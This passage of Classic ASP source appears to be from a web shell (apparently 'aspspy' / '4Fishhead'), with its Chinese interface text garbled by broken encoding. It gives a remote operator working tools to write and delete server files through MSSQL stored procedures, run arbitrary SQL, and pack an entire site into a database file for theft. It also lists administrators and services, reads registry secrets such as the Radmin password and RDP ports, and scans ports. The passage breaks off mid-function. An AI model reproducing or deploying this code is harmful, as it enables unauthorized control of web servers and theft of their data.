	
	private sub deleteFolder(path)
		on error resume next
		sqlStr="declare @fso int;exec master..sp_oacreate 'scripting.filesystemobject',@fso out;exec master..sp_oamethod @fso,'deletefolder',null,'"&path&"'"
		conn.execute(sqlStr)
		if err=0 then
			www output,"<br><div  style=""background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:center;font-weight:bold;"">ɾ���ļ��гɹ�</div><br>"
		end if
	end sub
	
	
	private sub renameFile(path1,path2)
		on error resume next
		sqlStr="declare @fso int;exec master..sp_oacreate 'scripting.filesystemobject',@fso out;exec master..sp_oamethod @fso,'movefile',null,'"&path1&"','"&path2&"'"
		conn.execute(sqlStr)
		if err=0 then
			www output,"<br><div  style=""background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:center;font-weight:bold;"">�ƶ��ļ��ɹ�</div><br>"
		end if
	end sub
	
	private sub copyFile(path1,path2)
		on error resume next
		sqlStr="declare @fso int;exec master..sp_oacreate 'scripting.filesystemobject',@fso out;exec master..sp_oamethod @fso,'copyfile',null,'"&path1&"','"&path2&"'"
		conn.execute(sqlStr)
		if err=0 then
			www output,"<br><div  style=""background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:center;font-weight:bold;"">�����ļ��ɹ�</div><br>"
		end if
	end sub
	
	private sub createFile(path)
		if  path<>"" then
			editFile(path)
		end if
	end sub
	
	private sub editFile(path)
		on error resume next
		dim content
		if myRequest("act2")="save" then
			isGo=1
			content=myRequest("fileContent")
			content=replace(content,"'","''")
			sqlStr="declare @fso int,@f int;exec master..sp_oacreate 'scripting.filesystemobject',@fso out;exec master..sp_oamethod @fso,'opentextfile',@f out,'"&path&"','2','true';exec master..sp_oamethod @f,'write',null,'"&content&"'"
			conn.execute(sqlStr)
			www output,"<br><div  style=""background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:center;font-weight:bold;"">�����ļ��ɹ�</div><br>"
			exit sub
		end if 
		sqlStr="drop table txtFile"
		conn.execute(sqlStr)
		if err then
			err.clear
		end if
		sqlStr="create table txtFile(line nvarchar(4000));bulk insert txtFile from '"&path&"';"
		conn.execute(sqlStr)
		
		sqlStr="select * from txtFile"
		set rs=conn.execute(sqlStr)
		do while not rs.eof
			content=content&rs("line")&vbcrlf
			rs.movenext
		loop
		sqlStr="drop table txtFile"
		conn.execute(sqlStr)
		if err then
			exit sub
		end if
		www output,"<table width=""100%"" border=""0"" cellpadding=""15"" cellspacing=""0""><td>"
		www output,"<form name=""editFileForm"" method=""post"" action="""&myName&""">"
		www output,"<p>&nbsp;&nbsp;&nbsp;��ǰ�ļ���ַ��<br>"
		www output,"<input name=""FName"" type=""text"" style=""margin:0 8px;height=22px;"" class=""input"" size=""100"" value="""&path&""" /></p>"
		www output,"<p>�ļ����ݣ�<br>"
		www output,"<textarea name=""fileContent""  class=""area"" cols=""100"" rows=""25"">"
		www output,content
		www output,"</textarea></p>"
		www output,"<input type=""hidden"" name=""act"" value=""editFile"">"
		www output,"<input type=""hidden"" name=""act2"" value="""">"
		www output,"<input type=""hidden"" name=""action"" value=""Rootkit"">"
		www output,"<p><input type=""submit"" name=""editSubmit"" value=""�ύ""  class=""bt"" onclick=""document.editFileForm.act2.value='save'""/> <input type=""Button"" name=""back"" value=""����"" class=""bt"" onclick=""history.go(-1);""/></p>"	
		www output,"</form>"
		output=output &"</table>"
		isGo=0
	end sub
	
	private sub class_Terminate()
		if isobject(conn) then
			conn.close
			set conn=nothing
		end if
	end sub
end class

function searchFile()
	dim output,fso,searchPath,fileName,fileExt
	output=""
	if myRequest("searchPath")<>"" then
		searchPath=myRequest("searchPath")
	else
		searchPath=wwwPath
	end if
	www output,"<table width=""100%"" border=""0"" cellpadding=""15"" cellspacing=""0"" ><tr><td  colspan=""3""><h2 id=""Bin_H2_Title"">searchFile &gt;&gt;</h2>"
	www output,"<table width=""100%"" border=""0"" cellpadding=""15"" cellspacing=""0""><td>"
	www output,"<form name=""searchForm"" method=""post"" action="""&myName&""">"
	www output,"<tr><td width=""50"">��Ŀ¼��</td>"
	www output,"<td width=""120""><input name=""searchPath"" type=""text"" style=""margin:0 8px;height=22px;"" class=""input"" size=""120"" value="""&searchPath&""" /></td><td></td></tr>"
	www output,"<tr><td>�ļ�����</td>"
	www output,"<td width=""120""><input name=""fileName"" type=""text"" style=""margin:0 8px;height=22px;"" class=""input"" size=""120"" value="""&myRequest("fileName")&""" /></td><td></td></tr>"
	www output,"<tr><td>��׺��</td>"
	www output,"<td width=""120""><input name=""fileExt"" type=""text"" style=""margin:0 8px;height=22px;"" class=""input"" size=""120"" value="""&myRequest("fileExt")&""" /></td>"
	www output,"<input type=""hidden"" name=""action"" value=""searchFile"">"	
	www output,"<input type=""hidden"" name=""act2"" value="""">"
	www output,"<input type=""hidden"" name=""tree"" value="""">"	
	www output,"<td align=""left""><input type=""submit"" name=""searchSubmit"" value=""�ύ""  class=""bt"" onclick=""document.searchForm.act2.value='save';""/> <input type=""submit"" name=""TreeBt"" value=""Ŀ¼��"" class=""bt"" onclick=""document.searchForm.act2.value='save';document.searchForm.tree.value='1';""/> <input type=""Button"" name=""back"" value=""����"" class=""bt"" onclick=""history.go(-1);""/></td></tr>"	
	www output,"</table>"
	www output,"<hr>"
	
	if myRequest("act2")="save" then
		if myRequest("tree")="1" then
			www output,"<span id="""&search&""">"
			www output,"<a href=""javascript:return false;"" onclick=""var obj=document.getElementById('"&format(searchPath)&"');hideObj(obj)""><font size=""3;"" color=""#0000FF""><b>"&searchPath&"</b></font></strong></a><br>"
			getPathTree searchPath,1,output
			www output,"</span >"
		else
			fileName=myRequest("fileName")
			fileExt=myRequest("fileExt")
			findFile searchPath,fileName,fileExt,output
			
		end if
		set fso=nothing
	end if
	response.write output
end function

function findFile(path,fileName,fileExt,output)
	dim folder,fs,fds,sign,fso
	set fso=server.CreateObject("scripting.filesystemobject")
	set folder=fso.getFolder(path)
	fileName=split(lcase(fileName),",")
	fileExt=split(lcase(fileExt),",")
	set fds=folder.subfolders
	for each fd in fds
		for i=0 to ubound(fileName)
			if lcase(fd.name)=fileName(i) then
				www output,fd.name
			end if
		next
	next
	set fs=folder.files
	for each f in fs
		fExt=mid(f.name,instrrev(f.name,".")+1)
		fExt=lcase(fExt)
		for i=0 to ubound(fileName)
			if lcase(f.name)=fileName(i) then
				www output,f.name
			end if
		next
		for i=0 to ubound(fileExt)
			if fExt=fileExt(i) then
				www output,f.name
			end if 
		next
	next
	
end function

function getPathTree(path,depth,output)
	dim folder,fs,fds,sign,fso
	set fso=server.CreateObject("scripting.filesystemobject")
	set folder=fso.getFolder(path)
	for i=1 to depth
		sign=sign&"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"
	next
	set fds=folder.subfolders
	www output,"<span id="""&path&""">"
	for each fd in fds
		www output,""&sign&"<a href=""javascript:var obj=document.getElementById('"&format(fd.path)&"');hideObj(obj)""><b>"&fd.path&"</b></a><br>"
		getPathTree fd.path,depth+1,output
	next
	set fs=folder.files
	for each f in fs
		www output,"<b>"&sign&f.path&"</b><br>"
	next
	www output,"</span>"
	set fso=nothing
end function

class pack
	private output,packPath,dbPathconn,connStr,tFilePath,tContent,tisFile,tdepth,rs,packType,i,fso,shell,fileTree,cat,notFile,notType

	private sub class_Initialize()
		on error resume next
		output=""
		redim fileTree(3,0)
		if myRequest("packPath")="" then
			packPath=myPath
		else
			packPath=myRequest("packPath")
		end if
		
		notFile=split(lcase(myRequest("notFile")),",")
		notType=split(lcase(myRequest("notType")),",")
		
		packType=myRequest("packType")
		if packType<>"" then
			packType=cint(packType)
		end if
		dbPath=myRequest("dbPath")
		connStr="Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&dbPath
		
		set fso=server.CreateObject("scripting.filesystemobject")
		set shell=server.CreateObject("shell.application")
		if err then
			err.clear
		end if
		i=0
		www output,"<table width=""100%"" border=""0"" cellpadding=""15"" cellspacing=""0"" ><tr><td><h2 id=""Bin_H2_Title"">webPack &gt;&gt;</h2>"
		www output,"<table width=""100%"" border=""0"" cellpadding=""15"" cellspacing=""0""><td>"
		www output,"<form name=""packForm"" method=""post"" action="""&myName&""">"
		www output,"<tr><td>&nbsp;&nbsp;&nbsp;վ��·����"
		www output,"<input name=""packPath"" type=""text"" style=""margin:0 8px;height=22px;"" class=""input"" size=""120"" value="""&packPath&""" />"
		www output,"<select name=""packType""  ><option value=""1"">FSO</option><option value=""2"">Shell.Application</option></select><br>"	
		www output,"&nbsp;&nbsp;&nbsp;����·����"
		www output,"<input name=""dbPath"" type=""text"" style=""margin:0 8px;height=22px;"" class=""input"" size=""120"" value="""&myPath&"\aspspy.mdb"" onkeyup=""document.packForm.notFile.value=this.value"" /><br>"
		www output,"&nbsp;&nbsp;&nbsp;�ų��ļ���"
		www output,"<input name=""notFile"" type=""text"" style=""margin:0 8px;height=22px;"" class=""input"" size=""120"" value="""&myPath&"\aspspy.mdb""  />(�Զ��ŷָ�,�������ļ���Ҳ�������ļ��У��磺c:\web\1.asp,c:\web)<br>"
		www output,"&nbsp;&nbsp;&nbsp;�ų����ͣ�"
		www output,"<input name=""notType"" type=""text"" style=""margin:0 8px;height=22px;"" class=""input"" size=""120"" value=""rmvb,avi,ldb"" />(�Զ��ŷָ��磺mdb,gif)</td></tr>"
		www output,"<input type=""hidden"" name=""action"" value=""pack"">"	
		www output,"<input type=""hidden"" name=""act2"" value="""">"	
		www output,"<tr><td><input type=""submit"" name=""packSubmit"" value=""�ύ""  class=""bt"" onclick=""document.packForm.act2.value='save'""/> <input type=""Button"" name=""back"" value=""����"" class=""bt"" onclick=""history.go(-1);""/></td></tr>"	
		www output,"</form>"
		www output,"</table>"
		
		response.Flush()
		www output,"<table align=""center"">"
		www output,"<tr><td><b><font color=""#0000FF"">��������</font></b></td><td></td></tr>"
		www output,"<tr><td><b><font color=""#0000FF"">��ǰ�ļ���</font></b></td><td><span id=""file"" align=""center"">0</span></td></tr>"
		www output,"<tr><td><b><font color=""#0000FF"">��&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;�ȣ�</font></b></td><td><span id=""process"" align=""center"">0%    0/0</span></td></tr>"
		www output,"</table>"
		response.write output
		showAbout()
		isEnd=false
		if myRequest("act2")="save" then
			If fso.FileExists(dbPath) Then
				fso.DeleteFile dbPath,True
			End If
			
			Set cat=CreateObject("ADOX.Catalog")
			cat.Create connStr
			Set cat=Nothing
			
			Set conn=CreateObject("adodb.connection")
			conn.Open connStr
			conn.Execute "create table pack(filename varchar(100),isFile int,depth int,content General)"
			Set rs=CreateObject("adodb.recordset")
			rs.Open "pack",conn,1,3
			
			'response.Flush()
			call getTree(packPath,1,packType)
			For j=1 To i 
				tFilePath=fileTree(1,j)
				readPath=tFilePath
				tFilePath=Mid(tFilePath,InStr(tFilePath,path)+Len(packPath))
				tisFile=fileTree(2,j)
				tdepth=fileTree(3,j)
				If tisFile=1 Then
					tContent=myRead(readPath)
				Else
					tContent=Null
				End If
				rs.AddNew
				rs("filename")=tFilePath
				rs("isFile")=tisFile
				rs("depth")=tdepth
				rs("content")=tContent
				rs.Update
				response.write "<script>var f=document.all(""file"");f.innerHTML='"&format(readPath)&"';</script>"
				response.write "<script>var p=document.all(""process"");p.innerHTML='"&cint((j/i)*100)&"%  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "&j&"/<b>"&i&"</b>';</script>"
				response.Flush()
			Next
				
			
			Set rs=nothing
			conn.Close
			Set conn=Nothing
			
		end if
	end sub
	
	private sub class_Terminate()
		set shell=nothing
		set fso=nothing
	end sub
	
	private sub getTree(path,depth,packType)
		on error resume next
		dim isPack
		if packType=1 then
			Dim rootFolder,folders,files
			Set rootFolder=fso.GetFolder(path)
			Set files=rootFolder.Files
			For Each f In files
				isPack=true
				fileExt=lcase(mid(f.path,instrrev(f.path,".")+1))
				for each nf in notFile
					if lcase(f.path)=nf then
						isPack=false
						exit for
					end if
				next
				for each nt in notType
					if fileExt=nt then
						isPack=false
					end if
				next
				if isPack then
					i=i+1
					ReDim Preserve fileTree(3,i)
					fileTree(1,i)=f.Path
					fileTree(2,i)=1
					fileTree(3,i)=depth
				end if
			Next
			Set folders=rootFolder.SubFolders
			For Each fd In folders
				isPack=true
				for each nf in notFile
					if lcase(fd.path)=nf then
						isPack=false
						exit for
					end if
				next
				if isPack then
					i=i+1
					ReDim Preserve fileTree(3,i)
					fileTree(1,i)=fd.Path
					fileTree(2,i)=0
					fileTree(3,i)=depth
					Call getTree(fd.Path,depth+1,packType)
				end if
			Next
		elseif packType=2 then
			path=Replace(path,"/","\")
			Do While Right(path,1)="\" 
				path=Left(path,Len(path)-1)
			Loop
			Set rootFolder=shell.NameSpace(path)
			Set subs=rootFolder.Items
			For Each f In subs
				If Not f.IsFolder Then
					i=i+1
					ReDim Preserve fileTree(3,i)
					fileTree(1,i)=f.Path
					fileTree(2,i)=1
					fileTree(3,i)=depth
				Else
					i=i+1
					ReDim Preserve fileTree(3,i)
					fileTree(1,i)=f.Path
					fileTree(2,i)=0
					fileTree(3,i)=depth
					Call getTree(f.Path,depth+1,packType)
				End If
			Next
		end if
	end sub
	
	private Function myRead(path)
		On Error Resume next
		Dim stream
		Set stream=CreateObject("adodb.stream")
		stream.Type=1
		stream.Mode=3
		stream.Open
		stream.LoadFromFile(path)
		myRead=stream.read
		stream.Close
		Set stream=Nothing
	End Function
end class

class dataBase
	private output,conn,dbPath,connStr,tables,rs,tableCount,cmd,currentPage
	private sub class_Initialize()
		dim dbStrs(2)
		dbStrs(1)="Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&session("currentPath")&"\db.mdb;Jet OLEDB:Database Password=***"
		dbStrs(2)="Driver={Sql Server};Server=127.0.0.1,1433;Database=DbName;Uid=sa;Pwd=321"
		connStr=myRequest("connStr")
		cmd=trim(myRequest("cmd"))
		www output,"<table width=""100%"" border=""0"" cellpadding=""15"" cellspacing=""0"" ><tr><td><h2 id=""Bin_H2_Title"">Database &gt;&gt;</h2>"
		www output,"<table width=""100%"" border=""0"" cellpadding=""15"" cellspacing=""0""><td>"
		www output,"<form name=""databaseForm"" method=""post"" action="""&myName&""">"
		www output,"<tr><td>&nbsp;&nbsp;&nbsp;�����ַ�����"
		www output,"<input name=""connStr"" type=""text"" style=""margin:0 8px;height=22px;"" class=""input"" size=""120"" value="""&connStr&""" />"
		www output,"<select name=""menu"" onchange=""javascript:document.databaseForm.connStr.value=this.value"" ><option value="""">�ַ�������</option><option value="""&dbStrs(1)&""">Access</option><option value="""&dbStrs(2)&""">MSSQL</select><br>"
		www output,"&nbsp;&nbsp;&nbsp;��&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;�"
		www output,"<input name=""cmd"" type=""text"" style=""margin:0 8px;height=22px;"" class=""input"" size=""120"" value="""&cmd&""" />"
		www output,"<input type=""hidden"" name=""action"" value=""database"">"	
		www output,"<input type=""hidden"" name=""act2"" value="""">"	
		www output,"<input type=""hidden"" name=""goPage"" value=""1"">"	
		www output,"<input type=""submit"" name=""databaseSubmit"" value=""�ύ""  class=""bt"" onclick=""document.databaseForm.act2.value='save'""/> <input type=""Button"" name=""back"" value=""����"" class=""bt"" onclick=""history.go(-1);""/></td><td>����һ��(MSSQL�˺������ݴ�)��<br><textArea align=""left"" cols=""40"" rows=""5""></textArea></td></tr>"	
		www output,"</form>"
		www output,"</table>"
		www output,"<hr>"
		response.write output
		output=""
		if myRequest("act2")="save" then
			tableCount=1
			set conn=server.CreateObject("adodb.connection")
			conn.open connStr
			
			set tables=conn.OpenSchema(20)
			www output,"<table>"
			www output,"<tr><td valign=""top""><table cellspacing=""0"" border=""0""  style=""border-width:0px;border-collapse:collapse;"">"
			www output,"<tr class=""head""><td align=""center"">��  ��</td></tr>"
			do while not tables.eof
				if tables("TABLE_TYPE")="TABLE" then
				tableCount=tableCount+1
					if (tableCount mod 2)=0 then
						styleSelect=2
					else
						styleSelect=1
					end if
					www output,"<tr class=""alt"&styleSelect&""" onmouseover=""this.className='focus';"" onmouseout=""this.className='alt"&styleSelect&"';""><td><a href=""#"" onclick=""document.databaseForm.cmd.value='select * from "&tables("TABLE_NAME")&"'"">"&tables("TABLE_NAME")&"</a></td></tr>"
				end if
				tables.movenext	
			loop
			set tables=nothing
			www output,"</table></td>"
			if cmd<>"" then
				if left(lcase(cmd),6)="select" then
					www output,"<td valign=""top""><table cellspacing=""0"" border=""1"" bordercolor=""#0000FF""  style=""border-width:1px;border-collapse:collapse;"">"
					www output,"<tr class=""head"">"
					set rs=server.CreateObject("adodb.recordset")
					rs.open cmd,conn,1,3
					For i=0 To rs.fields.count-1
						www output,"<td>"&rs.fields.item(i).name&"</td>"
					Next
					www output,"</tr>"
					rs.pageSize=10
					if not rs.eof then
						rs.AbsolutePage=cint(myRequest("goPage"))
					end if
					currentPage=cint(myRequest("goPage"))
					for i=1 to rs.pageSize 
						if rs.eof then
							exit for
						end if
						if (i mod 2)=0 then
							styleSelect=1
						else
							styleSelect=2
						end if
						www output,"<tr class=""alt"&styleSelect&""" onmouseover=""this.className='focus';"" onmouseout=""this.className='alt"&styleSelect&"';"">"
						For j=0 To rs.fields.count-1
							www output,"<td>"&rs(rs.fields.item(j).name)&"</td>"
						next
						www output,"</tr>"
						rs.movenext
					next
					
					www output,"<tr ><td align=""left"" colspan="""&rs.fields.count&""">��ҳ����"&rs.pageCount&"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;��ǰҳ��"&currentPage&"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp"
					www output,"<a href=""#"" onclick=""if ("&currentPage&"!=1){document.databaseForm.goPage.value='"&currentPage-1&"';document.databaseForm.act2.value='save';document.databaseForm.submit();}"">��һҳ</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"
					if currentPage+5>rs.pagecount then
						endPage=rs.pageCount
					else
						endPage=currentPage+5
					end if
					if currentPage-5<1 then
						startPage=1
					else
						startPage=currentPage-5
					end if
					for i=startPage to endPage
						if i=currentPage then
							www output,"<a href=""#""><b>"&i&"</b></a>&nbsp;"
						else
							www output,"<a href=""#"" onclick=""document.databaseForm.goPage.value='"&i&"';document.databaseForm.act2.value='save';document.databaseForm.submit();"">"&i&"</a>&nbsp;"
						end if
					next
					www output,"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href=""#"" onclick=""if ("&currentPage&"!="&rs.pageCount&"){document.databaseForm.goPage.value='"&currentPage+1&"';document.databaseForm.act2.value='save';document.databaseForm.submit();}"">��һҳ</a>"			
					www output,"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;��<input type=""text"" name=""myGoPage"" value="""&currentPage&""" style=""width:20px;"" >ҳ/"&rs.pageCount
					www output,"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type=""button"" value=""Go"" onclick=""document.databaseForm.goPage.value=document.getElementsByName('myGoPage')[0].value;document.databaseForm.act2.value='save';document.databaseForm.submit();"">"
					www output,"</td></tr>"
					www output,"</table></td>"
				else
					on error resume next
					if err then err.clear
					conn.Execute(cmd)
					if err.number=0 then
						www output,"<td valign=""top""><table cellspacing=""0"" border=""1"" bordercolor=""#0000FF""  style=""border-width:1px;border-collapse:collapse;"">"
					www output,"<tr class=""head""><td>ִ������"
						www output,cmd
						www output,"�ɹ�</td></tr></table></td>"
					end if
				end if
			end if
			www output,"</tr></table>"
		
			
			if isobject(conn) and conn.state=1  then
				conn.close
			end if
			if isobject(conn) then
				set conn=nothing
			end if
			
		end if
		
		response.write output
	end sub
	private sub class_Terminate()
		
	end sub
end class

class systemInfo
	private output,conn
	private sub class_Initialize()
		output=""
		www output,"<table width=""100%"" border=""0"" cellpadding=""15"" cellspacing=""0""><tr><td><h2 id=""Bin_H2_Title"">SystemInfo &gt;&gt;</h2><br>"
		www output,"<table width=""100%"" border=""0"" cellpadding=""15"" cellspacing=""0""><td>"
		www output,"<tr class=""alt1""><td colspan=""7"" style=""padding:5px;"">"
		www output,"<a  href=""javascript:inputBox('','objectInfo');"">�����Ϣ</a> | "
		www output,"<a  href=""javascript:inputBox('','portScan');"">�˿�ɨ��</a> | "
		www output,"<a  href=""javascript:inputBox('','userInfo');"">�û��˺�</a> | "
		www output,"<a  href=""javascript:inputBox('','getAdmin');"">����Ա</a> | "
		www output,"<a  href=""javascript:inputBox('','regReader');"">ע������</a> | "
		www output,"<a  href=""javascript:inputBox('php','testScript');"">php̽��</a> | "
		www output,"<a  href=""javascript:inputBox('aspx','testScript');"">aspx̽��</a> | "
		www output,"<a  href=""javascript:inputBox('jsp','testScript');"">jsp̽��</a> | "
		www output,"</table><br>"
		
		act=myRequest("act")
		scriptType=myRequest("fName")
		select case act
			case "objectInfo":
				objectInfo()
			case "userInfo":
				userInfo()
			case "getAdmin":
				getAdmin()
			case "testScript":
				testScript(scriptType)
			case "regReader":
				regReader()
			case "portScan":
				portScan()
		end select
		response.write  output
		
		
	end sub
	
	private sub class_Terminate()
		
	end sub
	
	private sub objectInfo()
		on error resume next
		if err then
			err.clear
		end if
		dim objs(10)
		objs(0)="Scripting.FileSystemObject"
		objs(1)="WScript.Shell"
		objs(2)="ADOX.Catalog"
		objs(3)="JRO.JetEngine"
		objs(4)="Scripting.Dictionary" 
		objs(5)="Adodb.connection"
		objs(6)="Adodb.Stream"
		objs(7) ="SoftArtisans.FileUp"
		objs(8) ="JMail.SmtpMail"
		objs(9) ="Microsoft.XMLHTTP"
		objs(10) ="Shell.application"
		www output,"<table border=""0"" align=""center"">"
		www output,"<tr> <td colspan=""2"" align=""center"" ><b>���������Ϣ<b></td></tr>"
		www output,"<tr align=""left"" ><td width=""50%"">��������ַ��"&replace(wwwUrl,"http://","")&":("&serverIP&")</td><td>������ʱ�䣺"&now()&"</td>"
		www output,"<tr align=""left""><td width=""50%"">CUP���飺"&myRequest.ServerVariables("NUMBER_OF_PROCESSORS")&"��</td><td>����������"&myRequest.ServerVariables.count&"��</td>"
		www output,"<tr align=""left""><td width=""50%"">����ϵͳ��"&myRequest.ServerVariables("OS")&"</td><td></td>"
		for each obj in objs 
			set testObj=server.CreateObject(obj)
			www output,"<tr align=""center""><td width=""200""><b>"&obj&"<b></td>"
			if (err and err.number<>0)  then
				err.clear
				www output,"<td>"&"<font color=""red""><b>�ر�<b></td>"
			else
				www output,"<td>"&"<font color=""green""><b>����<b></tr>"
				set test0bj=nothing
			end if
		next
		www output,"</table>"
	end sub 
	
	private sub userInfo()
		on error resume next
		dim shell,output1,output2,output3,lx
		output1=""
		output2=""
		output3=""
		set shell=server.CreateObject("shell.application")
		Set objCourse=GetObject("WinNT://.")
		www output,"<table border=""1"" align=""center"">"
		www output,"<tr> <td colspan=""2"" align=""center"" ><b>ϵͳ�û������<b></td></tr>"
		for each obj in objCourse
			err.clear
			if obj.StartType="" then
				output1=output1&"<tr align=""center""><td width=""200""><b>"&obj.name&"<b></td>"
				output1=output1&"<td width=""200"" align=""right""><b>ϵͳ�û�(��)<b></td></tr>"
			end if
			if obj.StartType=2 then lx="�Զ�"
   		    if obj.StartType=3 then lx="�ֶ�"  
    	    if obj.StartType=4 then lx="����"
			if LCase(mid(obj.path,4,3))<>"win" and obj.StartType=2 then
				output2=output2&"<tr><td>[��������:"&lx&"]</td><td>"&obj.Name&"---"&obj.DisplayName&"</td></tr><tr><td colspan=""2"">[����״̬:"&shell.IsServiceRunning(obj.Name)&"]<font color=""red""><b>"&obj.path&"</b></font></td></tr>"
			else
				output3=output3&"<tr><td>[��������:"&lx&"]</td><td>"&obj.Name&"---"&obj.DisplayName&"</td></tr><tr><td colspan=""2"">[����״̬:"&shell.IsServiceRunning(obj.Name)&"]<font color=""green""><b>"&obj.path&"</b></font></td></tr>"
			end if
		next
		www output,output1&"<p><tr><td colspan=""2""><br></td></tr></p>"&output2&output3
		www output,"</table>"
	end sub
	
	private sub getAdmin()
		on error resume next
		Set tN=server.createObject("Wscript.Network")

		Set objGroup=GetObject("WinNT://"&tN.ComputerName&"/Administrators,group")
		For Each admin in objGroup.Members
			www output,"<center><b>"&admin.name&"<b></center><br>"
		next
		set tn=nothing
	end sub
	
	private sub testScript(scriptType)
		dim fso
		set fso=server.CreateObject("scripting.filesystemobject")
		select case scriptType
			case "php"
				set f=fso.openTextFile(myPath&"\fishhead.php",2,true):f.writeLine("��ϲ֧��php<?php phpinfo()?>"):f.close:www output,"<iframe src=""fishhead.php""></iframe>"
			case "aspx"
				set f=fso.openTextFile(myPath&"\fishhead.aspx",2,true):f.writeLine("4Fishhead<br> by 3x  ����ֻ��һ�о��ǲ�֧����"):f.close:www output,"<iframe src=""fishhead.aspx""></iframe>"
			case "jsp"
				set f=fso.openTextFile(myPath&"\fishhead.jsp",2,true):f.writeLine("4Fishhead <br> by 3x  ����ֻ��һ�о��ǲ�֧����"):f.close:www output,"<iframe src=""fishhead.jsp""></iframe>"
		end select
		
		set fso=nothing
	end sub
	
	private sub regReader()
		dim regOption(11,2)
		regOption(1,1)="ComputerName"
		regOption(1,2)="HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName"
		regOption(2,1)="�����б�"
		regOption(2,2)="HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Linkage\Bind"
		regOption(3,1)="Radmin����"
		regOption(3,2)="HKLM\SYSTEM\RAdmin\v2.0\Server\Parameters\Parameter"
		regOption(4,1)="Radmin�˿�"
		regOption(4,2)="HKLM\SYSTEM\RAdmin\v2.0\Server\Parameters\Port"
		regOption(5,1)="3389�˿�"
		regOption(5,2)="HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\PortNumber"
		regOption(6,1)="PcAnyWhere���ݶ˿�"
		regOption(6,2)="HKLM\SOFTWARE\Symantec\pcAnywhere\CurrentVersion\System\TCPIPDataPort"
		regOption(7,1)="PcAnyW״̬�˿�"
		regOption(7,2)="HKLM\SOFTWARE\Symantec\pcAnywhere\CurrentVersion\System\TCPIPStatusPort"
		regOption(8,1)="Schedule Log"
		regOption(8,2)="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SchedulingAgent\LogPath"
		regOption(9,1)="����ǽ����"
		regOption(9,2)="HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List\3389:TCP"
		regOption(10,1)="�����ŵ�UDP�˿�"
		regOption(10,2)="HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\UDPAllowedPorts"
		regOption(11,1)="�����ŵ�TCP�˿�"
		regOption(11,2)="HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\TCPAllowedPorts"
		
		www output,"<table align=""center"">"
		www output,"<form name=""regForm"" method=""post"" action="""&myName&""">"
		www output,"<tr align=""center""><td><select name=""regSelect"" onclick=""document.regForm.regItem.value=this.value"">"
		www output,"<option value="""" select>���ü�ֵ</option>"
		for i=1 to ubound(regOption)
			www output,"<option value="""&regOption(i,2)&""">"&regOption(i,1)&"</option>"
		next
		www output,"</select></td></tr>"
		www output,"<tr><td>"
		www output,"<input name=""regItem"" type=""text"" style=""margin:0 8px;height=22px;"" class=""input"" size=""120"" value="""&myRequest("regItem")&""" />"
		www output,"<input type=""hidden"" name=""action"" value=""systemInfo"">"	
		www output,"<input type=""hidden"" name=""act2"" value="""">"	
		www output,"<input type=""hidden"" name=""act"" value=""regReader"">"
		www output,"<input type=""submit"" name=""regSubmit"" value=""�ύ""  class=""bt"" onclick=""document.regForm.act2.value='save'""/> <input type=""Button"" name=""back"" value=""����"" class=""bt"" onclick=""history.go(-1);""/></td></tr>"	
		www output,"<form>"
		
		if myRequest("act2")="save" and myRequest("regItem")<>"" then
			set shell=createobject("wscript.shell")
			reArr=shell.regRead(myRequest("regItem"))
			www output,"<tr><td align=""center""><font color=""#0000FF""><b>"
			if isArray(reArr) then
				for i=0 to ubound(reArr)
					www output,reArr(i)&"<br>"
				next
			else
				www output,reArr
			end if
			www output,"</b></font></td></tr>"
		end if
		www output,"</table>"
	end sub
		private sub portScan()
			dim port,ip,conn,connStr
			if myRequest("port")="" then
				port="21,80,135,1433,3306,43958"
			else
				port=myRequest("port")
			end if
			ip=myRequest("ip")
			www output,"<table align=""center"">"
			www output,"<form name=""portForm"" method=""post"" action="""&myName&""">"
			www output,"<tr><td>������ַ:</td><td>"
			www output,"<input name=""ip"" type=""text"" style=""margin:0 8px;height=22px;"" class=""input"" size=""120"" value=""127.0.0.1"" /></td></tr>"
			www output,"<tr><td>�˿�:</td><td>"
			www output,"<input name=""port"" type=""text"" style=""margin:0 8px;height=22px;"" class=""input"" size=""120"" value="""&port&""" />"
			www output,"<input type=""hidden"" name=""action"" value=""systemInfo"">"	
			www output,"<input type=""hidden"" name=""act"" value=""portScan"">"
			www output,"<input type=""hidden"" name=""act2"" value="""">"
			www output,"<input type=""submit"" name=""portSubmit"" value=""�ύ""  class=""bt"" onclick=""document.portForm.act2.value='save'""/> <input type=""Button"" name=""back"" value=""����"" class=""bt"" onclick=""history.go(-1);""/></td></tr>"	
			www output,"<form>"
			www output,"</table>"
			
			if myRequest("act2")="save" then
